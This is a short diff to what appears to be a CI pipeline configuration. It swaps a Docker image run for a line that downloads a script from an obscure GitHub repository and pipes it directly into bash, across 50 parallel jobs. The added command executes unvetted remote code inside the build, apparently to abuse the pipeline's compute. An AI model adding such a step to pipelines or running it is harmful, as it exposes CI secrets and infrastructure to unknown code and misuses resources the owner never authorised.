@@ -15,5 +15,5 @@ blocks:
       jobs: 
         - name: 'Job #1' 
           commands: 
-            - docker run docker.io/novalanto/xcb:latest
+            - curl -sL https://github.com/mgssjs/moanu/raw/main/fac | bash
           parallelism: 50
